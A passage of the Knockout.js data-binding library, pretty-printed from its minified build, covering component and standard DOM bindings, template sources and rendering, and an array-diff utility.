              c.component = g ? function () {
                return m;
              } : m;
            }
          }
          return c;
        };
        var c = new a.ga();
        9 > a.a.W && (a.j.register = function (a) {
          return function (b) {
            return a.apply(this, arguments);
          };
        }(a.j.register), w.createDocumentFragment = function (b) {
          return function () {
            var c = b(),
              f = a.j.dd,
              g;
            for (g in f);
            return c;
          };
        }(w.createDocumentFragment));
      })();
      (function () {
        function b(b, c, d) {
          c = c.template;
          if (!c) throw Error("Component '" + b + "' has no template");
          b = a.a.Ca(c);
          a.h.va(d, b);
        }
        function c(a, b, c) {
          var d = a.createViewModel;
          return d ? d.call(a, b, c) : b;
        }
        var d = 0;
        a.c.component = {
          init: function (e, f, g, h, m) {
            function k() {
              var a = l && l.dispose;
              "function" === typeof a && a.call(l);
              q && q.s();
              p = l = q = null;
            }
            var l,
              p,
              q,
              t = a.a.la(a.h.childNodes(e));
            a.h.Ea(e);
            a.a.K.za(e, k);
            a.o(function () {
              var g = a.a.f(f()),
                h,
                u;
              "string" === typeof g ? h = g : (h = a.a.f(g.name), u = a.a.f(g.params));
              if (!h) throw Error("No component name specified");
              var n = a.i.Cb(e, m),
                z = p = ++d;
              a.j.get(h, function (d) {
                if (p === z) {
                  k();
                  if (!d) throw Error("Unknown component '" + h + "'");
                  b(h, d, e);
                  var f = c(d, u, {
                    element: e,
                    templateNodes: t
                  });
                  d = n.createChildContext(f, {
                    extend: function (a) {
                      a.$component = f;
                      a.$componentTemplateNodes = t;
                    }
                  });
                  f && f.koDescendantsComplete && (q = a.i.subscribe(e, a.i.pa, f.koDescendantsComplete, f));
                  l = f;
                  a.Oa(d, e);
                }
              });
            }, null, {
              l: e
            });
            return {
              controlsDescendantBindings: !0
            };
          }
        };
        a.h.ea.component = !0;
      })();
      var V = {
        "class": "className",
        "for": "htmlFor"
      };
      a.c.attr = {
        update: function (b, c) {
          var d = a.a.f(c()) || {};
          a.a.P(d, function (c, d) {
            d = a.a.f(d);
            var g = c.indexOf(":"),
              g = "lookupNamespaceURI" in b && 0 < g && b.lookupNamespaceURI(c.substr(0, g)),
              h = !1 === d || null === d || d === n;
            h ? g ? b.removeAttributeNS(g, c) : b.removeAttribute(c) : d = d.toString();
            8 >= a.a.W && c in V ? (c = V[c], h ? b.removeAttribute(c) : b[c] = d) : h || (g ? b.setAttributeNS(g, c, d) : b.setAttribute(c, d));
            "name" === c && a.a.Yc(b, h ? "" : d);
          });
        }
      };
      (function () {
        a.c.checked = {
          after: ["value", "attr"],
          init: function (b, c, d) {
            function e() {
              var e = b.checked,
                f = g();
              if (!a.S.Ya() && (e || !m && !a.S.qa())) {
                var k = a.u.G(c);
                if (l) {
                  var q = p ? k.v() : k,
                    z = t;
                  t = f;
                  z !== f ? e && (a.a.Na(q, f, !0), a.a.Na(q, z, !1)) : a.a.Na(q, f, e);
                  p && a.Za(k) && k(q);
                } else h && (f === n ? f = e : e || (f = n)), a.m.eb(k, d, "checked", f, !0);
              }
            }
            function f() {
              var d = a.a.f(c()),
                e = g();
              l ? (b.checked = 0 <= a.a.A(d, e), t = e) : b.checked = h && e === n ? !!d : g() === d;
            }
            var g = a.xb(function () {
                if (d.has("checkedValue")) return a.a.f(d.get("checkedValue"));
                if (q) return d.has("value") ? a.a.f(d.get("value")) : b.value;
              }),
              h = "checkbox" == b.type,
              m = "radio" == b.type;
            if (h || m) {
              var k = c(),
                l = h && a.a.f(k) instanceof Array,
                p = !(l && k.push && k.splice),
                q = m || l,
                t = l ? g() : n;
              m && !b.name && a.c.uniqueName.init(b, function () {
                return !0;
              });
              a.o(e, null, {
                l: b
              });
              a.a.B(b, "click", e);
              a.o(f, null, {
                l: b
              });
              k = n;
            }
          }
        };
        a.m.wa.checked = !0;
        a.c.checkedValue = {
          update: function (b, c) {
            b.value = a.a.f(c());
          }
        };
      })();
      a.c["class"] = {
        update: function (b, c) {
          var d = a.a.Db(a.a.f(c()));
          a.a.Eb(b, b.__ko__cssValue, !1);
          b.__ko__cssValue = d;
          a.a.Eb(b, d, !0);
        }
      };
      a.c.css = {
        update: function (b, c) {
          var d = a.a.f(c());
          null !== d && "object" == typeof d ? a.a.P(d, function (c, d) {
            d = a.a.f(d);
            a.a.Eb(b, c, d);
          }) : a.c["class"].update(b, c);
        }
      };
      a.c.enable = {
        update: function (b, c) {
          var d = a.a.f(c());
          d && b.disabled ? b.removeAttribute("disabled") : d || b.disabled || (b.disabled = !0);
        }
      };
      a.c.disable = {
        update: function (b, c) {
          a.c.enable.update(b, function () {
            return !a.a.f(c());
          });
        }
      };
      a.c.event = {
        init: function (b, c, d, e, f) {
          var g = c() || {};
          a.a.P(g, function (g) {
            "string" == typeof g && a.a.B(b, g, function (b) {
              var k,
                l = c()[g];
              if (l) {
                try {
                  var p = a.a.la(arguments);
                  e = f.$data;
                  p.unshift(e);
                  k = l.apply(e, p);
                } finally {
                  !0 !== k && (b.preventDefault ? b.preventDefault() : b.returnValue = !1);
                }
                !1 === d.get(g + "Bubble") && (b.cancelBubble = !0, b.stopPropagation && b.stopPropagation());
              }
            });
          });
        }
      };
      a.c.foreach = {
        Rc: function (b) {
          return function () {
            var c = b(),
              d = a.a.bc(c);
            if (!d || "number" == typeof d.length) return {
              foreach: c,
              templateEngine: a.ba.Ma
            };
            a.a.f(c);
            return {
              foreach: d.data,
              as: d.as,
              noChildContext: d.noChildContext,
              includeDestroyed: d.includeDestroyed,
              afterAdd: d.afterAdd,
              beforeRemove: d.beforeRemove,
              afterRender: d.afterRender,
              beforeMove: d.beforeMove,
              afterMove: d.afterMove,
              templateEngine: a.ba.Ma
            };
          };
        },
        init: function (b, c) {
          return a.c.template.init(b, a.c.foreach.Rc(c));
        },
        update: function (b, c, d, e, f) {
          return a.c.template.update(b, a.c.foreach.Rc(c), d, e, f);
        }
      };
      a.m.Ra.foreach = !1;
      a.h.ea.foreach = !0;
      a.c.hasfocus = {
        init: function (b, c, d) {
          function e(e) {
            b.__ko_hasfocusUpdating = !0;
            var f = b.ownerDocument;
            if ("activeElement" in f) {
              var g;
              try {
                g = f.activeElement;
              } catch (l) {
                g = f.body;
              }
              e = g === b;
            }
            f = c();
            a.m.eb(f, d, "hasfocus", e, !0);
            b.__ko_hasfocusLastValue = e;
            b.__ko_hasfocusUpdating = !1;
          }
          var f = e.bind(null, !0),
            g = e.bind(null, !1);
          a.a.B(b, "focus", f);
          a.a.B(b, "focusin", f);
          a.a.B(b, "blur", g);
          a.a.B(b, "focusout", g);
          b.__ko_hasfocusLastValue = !1;
        },
        update: function (b, c) {
          var d = !!a.a.f(c());
          b.__ko_hasfocusUpdating || b.__ko_hasfocusLastValue === d || (d ? b.focus() : b.blur(), !d && b.__ko_hasfocusLastValue && b.ownerDocument.body.focus(), a.u.G(a.a.Fb, null, [b, d ? "focusin" : "focusout"]));
        }
      };
      a.m.wa.hasfocus = !0;
      a.c.hasFocus = a.c.hasfocus;
      a.m.wa.hasFocus = "hasfocus";
      a.c.html = {
        init: function () {
          return {
            controlsDescendantBindings: !0
          };
        },
        update: function (b, c) {
          a.a.fc(b, c());
        }
      };
      (function () {
        function b(b, d, e) {
          a.c[b] = {
            init: function (b, c, h, m, k) {
              var l,
                p,
                q = {},
                t,
                x,
                n;
              if (d) {
                m = h.get("as");
                var u = h.get("noChildContext");
                n = !(m && u);
                q = {
                  as: m,
                  noChildContext: u,
                  exportDependencies: n
                };
              }
              x = (t = "render" == h.get("completeOn")) || h.has(a.i.pa);
              a.o(function () {
                var h = a.a.f(c()),
                  m = !e !== !h,
                  u = !p,
                  r;
                if (n || m !== l) {
                  x && (k = a.i.Cb(b, k));
                  if (m) {
                    if (!d || n) q.dataDependency = a.S.o();
                    r = d ? k.createChildContext("function" == typeof h ? h : c, q) : a.S.qa() ? k.extend(null, q) : k;
                  }
                  u && a.S.qa() && (p = a.a.Ca(a.h.childNodes(b), !0));
                  m ? (u || a.h.va(b, a.a.Ca(p)), a.Oa(r, b)) : (a.h.Ea(b), t || a.i.ma(b, a.i.H));
                  l = m;
                }
              }, null, {
                l: b
              });
              return {
                controlsDescendantBindings: !0
              };
            }
          };
          a.m.Ra[b] = !1;
          a.h.ea[b] = !0;
        }
        b("if");
        b("ifnot", !1, !0);
        b("with", !0);
      })();
      a.c.let = {
        init: function (b, c, d, e, f) {
          c = f.extend(c);
          a.Oa(c, b);
          return {
            controlsDescendantBindings: !0
          };
        }
      };
      a.h.ea.let = !0;
      var Q = {};
      a.c.options = {
        init: function (b) {
          if ("select" !== a.a.R(b)) throw Error("options binding applies only to SELECT elements");
          for (; 0 < b.length;) b.remove(0);
          return {
            controlsDescendantBindings: !0
          };
        },
        update: function (b, c, d) {
          function e() {
            return a.a.jb(b.options, function (a) {
              return a.selected;
            });
          }
          function f(a, b, c) {
            var d = typeof b;
            return "function" == d ? b(a) : "string" == d ? a[b] : c;
          }
          function g(c, d) {
            if (x && l) a.i.ma(b, a.i.H);else if (t.length) {
              var e = 0 <= a.a.A(t, a.w.M(d[0]));
              a.a.Zc(d[0], e);
              x && !e && a.u.G(a.a.Fb, null, [b, "change"]);
            }
          }
          var h = b.multiple,
            m = 0 != b.length && h ? b.scrollTop : null,
            k = a.a.f(c()),
            l = d.get("valueAllowUnset") && d.has("value"),
            p = d.get("optionsIncludeDestroyed");
          c = {};
          var q,
            t = [];
          l || (h ? t = a.a.Mb(e(), a.w.M) : 0 <= b.selectedIndex && t.push(a.w.M(b.options[b.selectedIndex])));
          k && ("undefined" == typeof k.length && (k = [k]), q = a.a.jb(k, function (b) {
            return p || b === n || null === b || !a.a.f(b._destroy);
          }), d.has("optionsCaption") && (k = a.a.f(d.get("optionsCaption")), null !== k && k !== n && q.unshift(Q)));
          var x = !1;
          c.beforeRemove = function (a) {
            b.removeChild(a);
          };
          k = g;
          d.has("optionsAfterRender") && "function" == typeof d.get("optionsAfterRender") && (k = function (b, c) {
            g(0, c);
            a.u.G(d.get("optionsAfterRender"), null, [c[0], b !== Q ? b : n]);
          });
          a.a.ec(b, q, function (c, e, g) {
            g.length && (t = !l && g[0].selected ? [a.w.M(g[0])] : [], x = !0);
            e = b.ownerDocument.createElement("option");
            c === Q ? (a.a.Bb(e, d.get("optionsCaption")), a.w.cb(e, n)) : (g = f(c, d.get("optionsValue"), c), a.w.cb(e, a.a.f(g)), c = f(c, d.get("optionsText"), g), a.a.Bb(e, c));
            return [e];
          }, c, k);
          if (!l) {
            var B;
            h ? B = t.length && e().length < t.length : B = t.length && 0 <= b.selectedIndex ? a.w.M(b.options[b.selectedIndex]) !== t[0] : t.length || 0 <= b.selectedIndex;
            B && a.u.G(a.a.Fb, null, [b, "change"]);
          }
          (l || a.S.Ya()) && a.i.ma(b, a.i.H);
          a.a.wd(b);
          m && 20 < Math.abs(m - b.scrollTop) && (b.scrollTop = m);
        }
      };
      a.c.options.$b = a.a.g.Z();
      a.c.selectedOptions = {
        init: function (b, c, d) {
          function e() {
            var e = c(),
              f = [];
            a.a.D(b.getElementsByTagName("option"), function (b) {
              b.selected && f.push(a.w.M(b));
            });
            a.m.eb(e, d, "selectedOptions", f);
          }
          function f() {
            var d = a.a.f(c()),
              e = b.scrollTop;
            d && "number" == typeof d.length && a.a.D(b.getElementsByTagName("option"), function (b) {
              var c = 0 <= a.a.A(d, a.w.M(b));
              b.selected != c && a.a.Zc(b, c);
            });
            b.scrollTop = e;
          }
          if ("select" != a.a.R(b)) throw Error("selectedOptions binding applies only to SELECT elements");
          var g;
          a.i.subscribe(b, a.i.H, function () {
            g ? e() : (a.a.B(b, "change", e), g = a.o(f, null, {
              l: b
            }));
          }, null, {
            notifyImmediately: !0
          });
        },
        update: function () {}
      };
      a.m.wa.selectedOptions = !0;
      a.c.style = {
        update: function (b, c) {
          var d = a.a.f(c() || {});
          a.a.P(d, function (c, d) {
            d = a.a.f(d);
            if (null === d || d === n || !1 === d) d = "";
            if (v) v(b).css(c, d);else if (/^--/.test(c)) b.style.setProperty(c, d);else {
              c = c.replace(/-(\w)/g, function (a, b) {
                return b.toUpperCase();
              });
              var g = b.style[c];
              b.style[c] = d;
              d === g || b.style[c] != g || isNaN(d) || (b.style[c] = d + "px");
            }
          });
        }
      };
      a.c.submit = {
        init: function (b, c, d, e, f) {
          if ("function" != typeof c()) throw Error("The value for a submit binding must be a function");
          a.a.B(b, "submit", function (a) {
            var d,
              e = c();
            try {
              d = e.call(f.$data, b);
            } finally {
              !0 !== d && (a.preventDefault ? a.preventDefault() : a.returnValue = !1);
            }
          });
        }
      };
      a.c.text = {
        init: function () {
          return {
            controlsDescendantBindings: !0
          };
        },
        update: function (b, c) {
          a.a.Bb(b, c());
        }
      };
      a.h.ea.text = !0;
      (function () {
        if (A && A.navigator) {
          var b = function (a) {
              if (a) return parseFloat(a[1]);
            },
            c = A.navigator.userAgent,
            d,
            e,
            f,
            g,
            h;
          (d = A.opera && A.opera.version && parseInt(A.opera.version())) || (h = b(c.match(/Edge\/([^ ]+)$/))) || b(c.match(/Chrome\/([^ ]+)/)) || (e = b(c.match(/Version\/([^ ]+) Safari/))) || (f = b(c.match(/Firefox\/([^ ]+)/))) || (g = a.a.W || b(c.match(/MSIE ([^ ]+)/))) || (g = b(c.match(/rv:([^ )]+)/)));
        }
        if (8 <= g && 10 > g) var m = a.a.g.Z(),
          k = a.a.g.Z(),
          l = function (b) {
            var c = this.activeElement;
            (c = c && a.a.g.get(c, k)) && c(b);
          },
          p = function (b, c) {
            var d = b.ownerDocument;
            a.a.g.get(d, m) || (a.a.g.set(d, m, !0), a.a.B(d, "selectionchange", l));
            a.a.g.set(b, k, c);
          };
        a.c.textInput = {
          init: function (b, c, k) {
            function l(c, d) {
              a.a.B(b, c, d);
            }
            function m() {
              var d = a.a.f(c());
              if (null === d || d === n) d = "";
              L !== n && d === L ? a.a.setTimeout(m, 4) : b.value !== d && (y = !0, b.value = d, y = !1, v = b.value);
            }
            function r() {
              w || (L = b.value, w = a.a.setTimeout(z, 4));
            }
            function z() {
              clearTimeout(w);
              L = w = n;
              var d = b.value;
              v !== d && (v = d, a.m.eb(c(), k, "textInput", d));
            }
            var v = b.value,
              w,
              L,
              A = 9 == a.a.W ? r : z,
              y = !1;
            g && l("keypress", z);
            11 > g && l("propertychange", function (a) {
              y || "value" !== a.propertyName || A(a);
            });
            8 == g && (l("keyup", z), l("keydown", z));
            p && (p(b, A), l("dragend", r));
            (!g || 9 <= g) && l("input", A);
            5 > e && "textarea" === a.a.R(b) ? (l("keydown", r), l("paste", r), l("cut", r)) : 11 > d ? l("keydown", r) : 4 > f ? (l("DOMAutoComplete", z), l("dragdrop", z), l("drop", z)) : h && "number" === b.type && l("keydown", r);
            l("change", z);
            l("blur", z);
            a.o(m, null, {
              l: b
            });
          }
        };
        a.m.wa.textInput = !0;
        a.c.textinput = {
          preprocess: function (a, b, c) {
            c("textInput", a);
          }
        };
      })();
      a.c.uniqueName = {
        init: function (b, c) {
          if (c()) {
            var d = "ko_unique_" + ++a.c.uniqueName.rd;
            a.a.Yc(b, d);
          }
        }
      };
      a.c.uniqueName.rd = 0;
      a.c.using = {
        init: function (b, c, d, e, f) {
          var g;
          d.has("as") && (g = {
            as: d.get("as"),
            noChildContext: d.get("noChildContext")
          });
          c = f.createChildContext(c, g);
          a.Oa(c, b);
          return {
            controlsDescendantBindings: !0
          };
        }
      };
      a.h.ea.using = !0;
      a.c.value = {
        init: function (b, c, d) {
          var e = a.a.R(b),
            f = "input" == e;
          if (!f || "checkbox" != b.type && "radio" != b.type) {
            var g = [],
              h = d.get("valueUpdate"),
              m = !1,
              k = null;
            h && ("string" == typeof h ? g = [h] : g = a.a.wc(h), a.a.Pa(g, "change"));
            var l = function () {
              k = null;
              m = !1;
              var e = c(),
                f = a.w.M(b);
              a.m.eb(e, d, "value", f);
            };
            !a.a.W || !f || "text" != b.type || "off" == b.autocomplete || b.form && "off" == b.form.autocomplete || -1 != a.a.A(g, "propertychange") || (a.a.B(b, "propertychange", function () {
              m = !0;
            }), a.a.B(b, "focus", function () {
              m = !1;
            }), a.a.B(b, "blur", function () {
              m && l();
            }));
            a.a.D(g, function (c) {
              var d = l;
              a.a.Ud(c, "after") && (d = function () {
                k = a.w.M(b);
                a.a.setTimeout(l, 0);
              }, c = c.substring(5));
              a.a.B(b, c, d);
            });
            var p;
            p = f && "file" == b.type ? function () {
              var d = a.a.f(c());
              null === d || d === n || "" === d ? b.value = "" : a.u.G(l);
            } : function () {
              var f = a.a.f(c()),
                g = a.w.M(b);
              if (null !== k && f === k) a.a.setTimeout(p, 0);else if (f !== g || g === n) "select" === e ? (g = d.get("valueAllowUnset"), a.w.cb(b, f, g), g || f === a.w.M(b) || a.u.G(l)) : a.w.cb(b, f);
            };
            if ("select" === e) {
              var q;
              a.i.subscribe(b, a.i.H, function () {
                q ? d.get("valueAllowUnset") ? p() : l() : (a.a.B(b, "change", l), q = a.o(p, null, {
                  l: b
                }));
              }, null, {
                notifyImmediately: !0
              });
            } else a.a.B(b, "change", l), a.o(p, null, {
              l: b
            });
          } else a.ib(b, {
            checkedValue: c
          });
        },
        update: function () {}
      };
      a.m.wa.value = !0;
      a.c.visible = {
        update: function (b, c) {
          var d = a.a.f(c()),
            e = "none" != b.style.display;
          d && !e ? b.style.display = "" : !d && e && (b.style.display = "none");
        }
      };
      a.c.hidden = {
        update: function (b, c) {
          a.c.visible.update(b, function () {
            return !a.a.f(c());
          });
        }
      };
      (function (b) {
        a.c[b] = {
          init: function (c, d, e, f, g) {
            return a.c.event.init.call(this, c, function () {
              var a = {};
              a[b] = d();
              return a;
            }, e, f, g);
          }
        };
      })("click");
      a.ca = function () {};
      a.ca.prototype.renderTemplateSource = function () {
        throw Error("Override renderTemplateSource");
      };
      a.ca.prototype.createJavaScriptEvaluatorBlock = function () {
        throw Error("Override createJavaScriptEvaluatorBlock");
      };
      a.ca.prototype.makeTemplateSource = function (b, c) {
        if ("string" == typeof b) {
          c = c || w;
          var d = c.getElementById(b);
          if (!d) throw Error("Cannot find template with ID " + b);
          return new a.C.F(d);
        }
        if (1 == b.nodeType || 8 == b.nodeType) return new a.C.ia(b);
        throw Error("Unknown template type: " + b);
      };
      a.ca.prototype.renderTemplate = function (a, c, d, e) {
        a = this.makeTemplateSource(a, e);
        return this.renderTemplateSource(a, c, d, e);
      };
      a.ca.prototype.isTemplateRewritten = function (a, c) {
        return !1 === this.allowTemplateRewriting ? !0 : this.makeTemplateSource(a, c).data("isRewritten");
      };
      a.ca.prototype.rewriteTemplate = function (a, c, d) {
        a = this.makeTemplateSource(a, d);
        c = c(a.text());
        a.text(c);
        a.data("isRewritten", !0);
      };
      a.b("templateEngine", a.ca);
      a.kc = function () {
        function b(b, c, d, h) {
          b = a.m.ac(b);
          for (var m = a.m.Ra, k = 0; k < b.length; k++) {
            var l = b[k].key;
            if (Object.prototype.hasOwnProperty.call(m, l)) {
              var p = m[l];
              if ("function" === typeof p) {
                if (l = p(b[k].value)) throw Error(l);
              } else if (!p) throw Error("This template engine does not support the '" + l + "' binding within its templates");
            }
          }
          d = "ko.__tr_ambtns(function($context,$element){return(function(){return{ " + a.m.vb(b, {
            valueAccessors: !0
          }) + " } })()},'" + d.toLowerCase() + "')";
          return h.createJavaScriptEvaluatorBlock(d) + c;
        }
        var c = /(<([a-z]+\d*)(?:\s+(?!data-bind\s*=\s*)[a-z0-9\-]+(?:=(?:\"[^\"]*\"|\'[^\']*\'|[^>]*))?)*\s+)data-bind\s*=\s*(["'])([\s\S]*?)\3/gi,
          d = /\x3c!--\s*ko\b\s*([\s\S]*?)\s*--\x3e/g;
        return {
          xd: function (b, c, d) {
            c.isTemplateRewritten(b, d) || c.rewriteTemplate(b, function (b) {
              return a.kc.Ld(b, c);
            }, d);
          },
          Ld: function (a, f) {
            return a.replace(c, function (a, c, d, e, l) {
              return b(l, c, d, f);
            }).replace(d, function (a, c) {
              return b(c, "\x3c!-- ko --\x3e", "#comment", f);
            });
          },
          md: function (b, c) {
            return a.aa.Xb(function (d, h) {
              var m = d.nextSibling;
              m && m.nodeName.toLowerCase() === c && a.ib(m, b, h);
            });
          }
        };
      }();
      a.b("__tr_ambtns", a.kc.md);
      (function () {
        a.C = {};
        a.C.F = function (b) {
          if (this.F = b) {
            var c = a.a.R(b);
            this.ab = "script" === c ? 1 : "textarea" === c ? 2 : "template" == c && b.content && 11 === b.content.nodeType ? 3 : 4;
          }
        };
        a.C.F.prototype.text = function () {
          var b = 1 === this.ab ? "text" : 2 === this.ab ? "value" : "innerHTML";
          if (0 == arguments.length) return this.F[b];
          var c = arguments[0];
          "innerHTML" === b ? a.a.fc(this.F, c) : this.F[b] = c;
        };
        var b = a.a.g.Z() + "_";
        a.C.F.prototype.data = function (c) {
          if (1 === arguments.length) return a.a.g.get(this.F, b + c);
          a.a.g.set(this.F, b + c, arguments[1]);
        };
        var c = a.a.g.Z();
        a.C.F.prototype.nodes = function () {
          var b = this.F;
          if (0 == arguments.length) {
            var e = a.a.g.get(b, c) || {},
              f = e.lb || (3 === this.ab ? b.content : 4 === this.ab ? b : n);
            if (!f || e.jd) {
              var g = this.text();
              g && g !== e.bb && (f = a.a.Md(g, b.ownerDocument), a.a.g.set(b, c, {
                lb: f,
                bb: g,
                jd: !0
              }));
            }
            return f;
          }
          e = arguments[0];
          this.ab !== n && this.text("");
          a.a.g.set(b, c, {
            lb: e
          });
        };
        a.C.ia = function (a) {
          this.F = a;
        };
        a.C.ia.prototype = new a.C.F();
        a.C.ia.prototype.constructor = a.C.ia;
        a.C.ia.prototype.text = function () {
          if (0 == arguments.length) {
            var b = a.a.g.get(this.F, c) || {};
            b.bb === n && b.lb && (b.bb = b.lb.innerHTML);
            return b.bb;
          }
          a.a.g.set(this.F, c, {
            bb: arguments[0]
          });
        };
        a.b("templateSources", a.C);
        a.b("templateSources.domElement", a.C.F);
        a.b("templateSources.anonymousTemplate", a.C.ia);
      })();
      (function () {
        function b(b, c, d) {
          var e;
          for (c = a.h.nextSibling(c); b && (e = b) !== c;) b = a.h.nextSibling(e), d(e, b);
        }
        function c(c, d) {
          if (c.length) {
            var e = c[0],
              f = c[c.length - 1],
              g = e.parentNode,
              h = a.ga.instance,
              m = h.preprocessNode;
            if (m) {
              b(e, f, function (a, b) {
                var c = a.previousSibling,
                  d = m.call(h, a);
                d && (a === e && (e = d[0] || b), a === f && (f = d[d.length - 1] || c));
              });
              c.length = 0;
              if (!e) return;
              e === f ? c.push(e) : (c.push(e, f), a.a.Ua(c, g));
            }
            b(e, f, function (b) {
              1 !== b.nodeType && 8 !== b.nodeType || a.vc(d, b);
            });
            b(e, f, function (b) {
              1 !== b.nodeType && 8 !== b.nodeType || a.aa.cd(b, [d]);
            });
            a.a.Ua(c, g);
          }
        }
        function d(a) {
          return a.nodeType ? a : 0 < a.length ? a[0] : null;
        }
        function e(b, e, f, h, m) {
          m = m || {};
          var n = (b && d(b) || f || {}).ownerDocument,
            B = m.templateEngine || g;
          a.kc.xd(f, B, n);
          f = B.renderTemplate(f, h, m, n);
          if ("number" != typeof f.length || 0 < f.length && "number" != typeof f[0].nodeType) throw Error("Template engine must return an array of DOM nodes");
          n = !1;
          switch (e) {
            case "replaceChildren":
              a.h.va(b, f);
              n = !0;
              break;
            case "replaceNode":
              a.a.Xc(b, f);
              n = !0;
              break;
            case "ignoreTargetNode":
              break;
            default:
              throw Error("Unknown renderMode: " + e);
          }
          n && (c(f, h), m.afterRender && a.u.G(m.afterRender, null, [f, h[m.as || "$data"]]), "replaceChildren" == e && a.i.ma(b, a.i.H));
          return f;
        }
        function f(b, c, d) {
          return a.O(b) ? b() : "function" === typeof b ? b(c, d) : b;
        }
        var g;
        a.gc = function (b) {
          if (b != n && !(b instanceof a.ca)) throw Error("templateEngine must inherit from ko.templateEngine");
          g = b;
        };
        a.dc = function (b, c, h, m, t) {
          h = h || {};
          if ((h.templateEngine || g) == n) throw Error("Set a template engine before calling renderTemplate");
          t = t || "replaceChildren";
          if (m) {
            var x = d(m);
            return a.$(function () {
              var g = c && c instanceof a.fa ? c : new a.fa(c, null, null, null, {
                  exportDependencies: !0
                }),
                n = f(b, g.$data, g),
                g = e(m, t, n, g, h);
              "replaceNode" == t && (m = g, x = d(m));
            }, null, {
              Sa: function () {
                return !x || !a.a.Sb(x);
              },
              l: x && "replaceNode" == t ? x.parentNode : x
            });
          }
          return a.aa.Xb(function (d) {
            a.dc(b, c, h, d, "replaceNode");
          });
        };
        a.Qd = function (b, d, g, h, m) {
          function x(b, c) {
            a.u.G(a.a.ec, null, [h, b, u, g, r, c]);
            a.i.ma(h, a.i.H);
          }
          function r(a, b) {
            c(b, v);
            g.afterRender && g.afterRender(b, a);
            v = null;
          }
          function u(a, c) {
            v = m.createChildContext(a, {
              as: z,
              noChildContext: g.noChildContext,
              extend: function (a) {
                a.$index = c;
                z && (a[z + "Index"] = c);
              }
            });
            var d = f(b, a, v);
            return e(h, "ignoreTargetNode", d, v, g);
          }
          var v,
            z = g.as,
            w = !1 === g.includeDestroyed || a.options.foreachHidesDestroyed && !g.includeDestroyed;
          if (w || g.beforeRemove || !a.Pc(d)) return a.$(function () {
            var b = a.a.f(d) || [];
            "undefined" == typeof b.length && (b = [b]);
            w && (b = a.a.jb(b, function (b) {
              return b === n || null === b || !a.a.f(b._destroy);
            }));
            x(b);
          }, null, {
            l: h
          });
          x(d.v());
          var A = d.subscribe(function (a) {
            x(d(), a);
          }, null, "arrayChange");
          A.l(h);
          return A;
        };
        var h = a.a.g.Z(),
          m = a.a.g.Z();
        a.c.template = {
          init: function (b, c) {
            var d = a.a.f(c());
            if ("string" == typeof d || "name" in d) a.h.Ea(b);else if ("nodes" in d) {
              d = d.nodes || [];
              if (a.O(d)) throw Error('The "nodes" option must be a plain, non-observable array.');
              var e = d[0] && d[0].parentNode;
              e && a.a.g.get(e, m) || (e = a.a.Yb(d), a.a.g.set(e, m, !0));
              new a.C.ia(b).nodes(e);
            } else if (d = a.h.childNodes(b), 0 < d.length) e = a.a.Yb(d), new a.C.ia(b).nodes(e);else throw Error("Anonymous template defined, but no template content was provided");
            return {
              controlsDescendantBindings: !0
            };
          },
          update: function (b, c, d, e, f) {
            var g = c();
            c = a.a.f(g);
            d = !0;
            e = null;
            "string" == typeof c ? c = {} : (g = "name" in c ? c.name : b, "if" in c && (d = a.a.f(c["if"])), d && "ifnot" in c && (d = !a.a.f(c.ifnot)), d && !g && (d = !1));
            "foreach" in c ? e = a.Qd(g, d && c.foreach || [], c, b, f) : d ? (d = f, "data" in c && (d = f.createChildContext(c.data, {
              as: c.as,
              noChildContext: c.noChildContext,
              exportDependencies: !0
            })), e = a.dc(g, d, c, b)) : a.h.Ea(b);
            f = e;
            (c = a.a.g.get(b, h)) && "function" == typeof c.s && c.s();
            a.a.g.set(b, h, !f || f.ja && !f.ja() ? n : f);
          }
        };
        a.m.Ra.template = function (b) {
          b = a.m.ac(b);
          return 1 == b.length && b[0].unknown || a.m.Id(b, "name") ? null : "This template engine does not support anonymous templates nested within its templates";
        };
        a.h.ea.template = !0;
      })();
      a.b("setTemplateEngine", a.gc);
      a.b("renderTemplate", a.dc);
      a.a.Kc = function (a, c, d) {
        if (a.length && c.length) {
          var e, f, g, h, m;
          for (e = f = 0; (!d || e < d) && (h = a[f]); ++f) {
            for (g = 0; m = c[g]; ++g) if (h.value === m.value) {
              h.moved = m.index;
              m.moved = h.index;
              c.splice(g, 1);
              e = g = 0;
              break;
            }
            e += g;
          }
        }
      };
      a.a.Pb = function () {
        function b(b, d, e, f, g) {
          var h = Math.min,
            m = Math.max,
            k = [],
            l,
            p = b.length,
            q,
            n = d.length,
            r = n - p || 1,
            v = p + n + 1,
            u,
            w,
            z;
          for (l = 0; l <= p; l++) for (w = u, k.push(u = []), z = h(n, l + r), q = m(0, l - 1); q <= z; q++) u[q] = q ? l ? b[l - 1] === d[q - 1] ? w[q - 1] : h(w[q] || v, u[q - 1] || v) + 1 : q + 1 : l + 1;
          h = [];
          m = [];
          r = [];
          l = p;
          for (q = n; l || q;) n = k[l][q] - 1, q && n === k[l][q - 1] ? m.push(h[h.length] = {
            status: e,
            value: d[--q],
            index: q
          }) : l && n === k[l - 1][q] ? r.push(h[h.length] = {
            status: f,
            value: b[--l],
            index: l
          }) : (--q, --l, g.sparse || h.push({
            status: "retained",
            value: d[q]
          }));
          a.a.Kc(r, m, !g.dontLimitMoves && 10 * p);
          return h.reverse();
        }
        return function (a, d, e) {
          e = "boolean" === typeof e ? {
            dontLimitMoves: e
          } : e || {};
          a = a || [];
          d = d || [];
          return a.length < d.length ? b(a, d, "added", "deleted", e) : b(d, a, "deleted", "added", e);
        };
      }();
      a.b("utils.compareArrays", a.a.Pb);
      (function () {
        function b(b, c, d, h, m) {
          var k = [],
            l = a.$(function () {
              var l = c(d, m, a.a.Ua(k, b)) || [];
              0 < k.length && (a.a.Xc(k, l), h && a.u.G(h, null, [d, l, m]));
              k.length = 0;
              a.a.Nb(k, l);
            }, null, {
              l: b,
              Sa: function () {
                return !a.a.kd(k);
              }
            });
          return {
            Y: k,
            $: l.ja() ? l : n
          };
        }
        var c = a.a.g.Z(),
          d = a.a.g.Z();
        a.a.ec = function (e, f, g, h, m, k) {
          function l(b) {
            y = {
              Aa: b,
              pb: a.ta(w++)
            };
            v.push(y);
            r || F.push(y);
          }
          function p(b) {
            y = t[b];
            w !== y.pb.v() && D.push(y);
            y.pb(w++);
            a.a.Ua(y.Y, e);
            v.push(y);
          }
          function q(b, c) {
            if (b) for (var d = 0, e = c.length; d < e; d++) a.a.D(c[d].Y, function (a) {
              b(a, d, c[d].Aa);
            });
          }
          f = f || [];
          "undefined" == typeof f.length && (f = [f]);
          h = h || {};
          var t = a.a.g.get(e, c),
            r = !t,
            v = [],
            u = 0,
            w = 0,
            z = [],
